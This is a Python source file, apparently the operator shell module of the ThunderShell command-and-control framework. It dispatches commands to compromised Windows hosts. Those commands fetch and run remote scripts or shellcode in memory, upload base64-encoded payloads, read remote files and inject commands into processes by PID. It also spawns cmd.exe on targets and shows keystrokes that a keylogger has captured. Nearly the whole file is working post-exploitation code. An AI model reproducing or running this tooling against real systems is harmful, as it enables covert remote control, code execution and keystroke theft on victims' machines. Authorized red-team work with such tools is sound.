#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/shell.py
"""
import os
import base64
import subprocess

from tabulate import tabulate

from core.vars import THUNDERSHELL
from core.alias import Alias
from core.utils import Utils
from core.ui import UI
from core.log import Log

class Shell:

    def __init__(self, db, cli = False):
        self.cli = cli
        self.db = db
        self.init_cmds()

    def init_cmds(self):
        self.cmds = {}
        self.cmds['help'] = self.help
        self.cmds['fetch'] = self.fetch
        self.cmds['shell'] = self.shell_exec
        self.cmds['read'] = self.read_file
        self.cmds['upload'] = self.upload_file
        self.cmds['delay'] = self.update_delay
        self.cmds['exec'] = self.exec_code
        self.cmds['ps'] = self.ps
        self.cmds['inject'] = self.inject
        self.cmds['alias'] = self.set_alias
        self.cmds['background'] = None
        self.cmds['keylogger'] = self.keylogger
        self.cmds['exit'] = self.exit
        self.alias = Alias()

    def get_cmd(self):
        return self.cmds

    def flush_output(self):
        self.output = ""

    def evalute_cmd(self, cmd):
        full_cmd = cmd
        self.flush_output()

        self.data = cmd
        cmd = self.data.split(' ', 1)[0].lower()

        if cmd not in self.cmds:
            return ("", full_cmd)

        callback = self.cmds[cmd]

        if not callback == None:
            data = callback()
            return (self.output, data)

        return ("", "")

    def output_cli_or_str(self, message):
        if self.cli:
            UI.warn(message)
            return ""
        else:
            return "[*] %s\n" % message

    def help(self):
        self.output = '''Help Menu\n''' + '=' * 9 + \
        '\n' + tabulate({'_Commands': [
            'background',
            'fetch',
            'exec',
            'read',
            'upload',
            'ps',
            'inject',
            'keylogger',
            'alias',
            'delay',
            'shell',
	    'screenshot',
            'help',
            ],
            '__Args': [
            '',
            'path/url, cmd',
            'path/url',
            'remote path',
            'path/url, path',
            '',
            'pid, command',
            'number of line (default 20)',
            'key, value',
            'milliseconds',
            'command',
            '',
            '',
            ],
            '___Descriptions': [
            'Return to the main console (CLI only)',
            'In memory execution of a script and execute a command',
            'In memory execution of code (shellcode)',
            'Read a file on the remote host',
            'Upload a file on the remote system',
            'List processes',
            'Inject command into a target process (max length 4096)',
            'Show last n line of keystrokes captured',
            'Create an alias to avoid typing the same thing over and over',
            'Update the callback delay',
            'Run command by spawning cmd.exe /c',
            'Take a screenshot',
            'show this help menu',
            ]},
            headers="keys", tablefmt="simple")

        self.output += self.alias.list_alias()
        self.output += self.alias.list_custom_alias()
        return ""


    def fetch(self):
        try:
            (cmd, path, ps) = self.data.split(" ", 2)
        except:
            self.output += self.output_cli_or_str("Missing arguments")
            return ""

        data = ""
        path = self.alias.get_alias(path)
        if Utils.file_exists(path, False, False):
            data = Utils.load_file_unsafe(path).decode()
        else:
            data = Utils.download_url(path)

        if not data == "":
            self.output += self.output_cli_or_str("Fetching %s" % path)
            self.output += self.output_cli_or_str("Executing %s" % ps)
            return "%s;%s" % (data, ps)
        else:
            self.output += self.output_cli_or_str("Cannot fetch the resource")
            return ""

    def keylogger(self):
        size = Utils.get_arg_at(self.data, 1, 2)
        try:
            size = int(size)
        except:
            size = 20
        proc = subprocess.Popen("tail -n %d %skeylogger_%s.log" % (size, Log.create_folder_tree(), self.guid), shell=True, stdout=subprocess.PIPE)
        self.output = proc.stdout.read()
        return ""

    def read_file(self):
        try:
            (cmd, path) = self.data.split(" ", 2)
            return "Get-Content %s" % path
        except:
            self.output += self.output_cli_or_str("Missing arguments")
            return ""

    def upload_file(self):
        try:
            (cmd, path, remote) = self.data.split(" ", 2)
        except:
            self.output += self.output_cli_or_str("Missing arguments")
            return ""

        data = ""
        #path = self.alias.get_alias(path)
        if Utils.file_exists(path, False, False):
            data = Utils.load_file_unsafe(path)
        else:
            data = Utils.download_url(path)

        if not data == "":
            self.output += self.output_cli_or_str("Fetching %s" % path)

            data = base64.b64encode(data)
            ps = Utils.load_powershell_script("%s/upload.ps1" % THUNDERSHELL.POWERSHELL_SCRIPT, 3)
            ps = Utils.update_key(ps, "PAYLOAD", data.decode())
            ps = Utils.update_key(ps, "PATH", remote)
            self.output += self.output_cli_or_str("Payload will be saved at %s" % path)
            return ps
        else:
            self.output += self.output_cli_or_str("Cannot fetch the resource")
            return data

    def exec_code(self):
        try:
            (cmd, path) = self.data.split(" ", 1)
        except:
            self.output += self.output_cli_or_str("Missing arguments")
            return ""

        data = ""
        path = self.alias.get_alias(path)
        if Utils.file_exists(path, False, False):
            data = Utils.load_file_unsafe(path)
        else:
            data = Utils.download_url(path)

        if not data == "":
            self.output += self.output_cli_or_str("Fetching %s" % path)
            data = base64.b64encode(data)
            ps = Utils.load_powershell_script("%s/exec.ps1" % THUNDERSHELL.POWERSHELL_SCRIPT, 16)
            ps = Utils.update_key(ps, "PAYLOAD", data)
            self.output += self.output_cli_or_str("Payload should be executed shortly on the target")
            return ps
        else:
            self.output += self.output_cli_or_str("Cannot fetch the resource")
            return data

    def inject(self):
        try:
            (option, pid, cmd) = self.data.split(" ", 2)
        except:
            self.output += self.output_cli_or_str("Missing arguments")
            return ""
        ps = Utils.load_powershell_script("%s/injector.ps1" % THUNDERSHELL.POWERSHELL_SCRIPT, 1)
        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(cmd))
        ps = Utils.update_key(ps, "PID", pid)
        self.output += self.output_cli_or_str("Injecting %s" % cmd)
        self.output += self.output_cli_or_str("Into process with PID %s" % pid)
        return ps

    def ps(self):
        ps = Utils.load_powershell_script("%s/ps.ps1" % THUNDERSHELL.POWERSHELL_SCRIPT, 0)
        return ps

    def update_delay(self):
        delay = Utils.get_arg_at(self.data, 1, 2)
        self.output += self.output_cli_or_str("Updating delay to %s" % delay)
        return "delay %s" % delay

    def set_alias(self):
        try:
            (cmd, key, value) = self.data.split(" ", 2)
        except:
            self.output += self.output_cli_or_str("Missing arguments")
            return ""

        self.alias.set_custom(key, value)
        self.output += self.output_cli_or_str("%s is now set to %s" % (key, value))
        return ""

    def shell_exec(self):
         command = Utils.get_arg_at(self.data, 1, 1)
         self.output += self.output_cli_or_str("Spawning cmd.exe to execute: %s" % command)
         return "cmd.exe /c %s" % command

    def exit(self):
        return "exit"    